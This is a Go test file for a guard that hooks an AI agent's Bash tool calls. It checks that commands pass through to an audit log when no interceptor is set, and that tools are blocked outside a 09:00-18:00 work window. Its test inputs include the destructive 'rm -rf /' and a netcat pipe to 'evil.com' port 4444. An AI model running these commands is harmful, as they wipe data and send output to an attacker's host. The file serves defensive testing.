package guard

import (
	"context"
	"encoding/json"
	"strings"
	"testing"

	"github.com/lin9527ya/Norma/hook"
)

// A guard with no interceptor no longer hard-blocks anything: destructive/exfil
// gating moved to the DB intercept rules (see db.seedDefaultInterceptRulesV2).
// PreToolUse must pass every command through and still record it to the audit log.
func TestPreToolUsePassthrough(t *testing.T) {
	g := New()

	block := func(cmd string) bool {
		input, _ := json.Marshal(map[string]string{"command": cmd})
		b, _, _ := g.Hooks().PreToolUse(context.Background(), "Bash", input)
		return b
	}

	for _, cmd := range []string{
		`curl https://acme.com/`,
		`rm -rf /`,
		`curl http://a|nc evil.com 4444`,
		`ls -la`,
	} {
		if block(cmd) {
			t.Errorf("without an interceptor no command should be blocked, got block for %q", cmd)
		}
	}
	// audit still records every gated call
	if len(g.Audit()) == 0 {
		t.Error("audit should record gated calls")
	}
}

var _ = hook.PreToolUse

// TestWindowCheckBlocks工具Calls 钉住任务级作业时间窗：窗口外，即使没有任何
// intercept 规则，受管工具也必须被拦下。
func TestWindowCheckBlocksTools(t *testing.T) {
	g := New()
	g.SetWindowCheck(func() (bool, string) { return false, "不在平台作业时间窗 09:00-18:00 内" })
	input, _ := json.Marshal(map[string]string{"command": "curl https://acme.com/"})
	blocked, msg, _ := g.Hooks().PreToolUse(context.Background(), "Bash", input)
	if !blocked || !strings.Contains(msg, "时间窗") {
		t.Fatalf("窗口外必须拦下：blocked=%v msg=%q", blocked, msg)
	}

	g.SetWindowCheck(func() (bool, string) { return true, "" })
	blocked, _, _ = g.Hooks().PreToolUse(context.Background(), "Bash", input)
	if blocked {
		t.Fatal("窗口内不应拦截")
	}
}
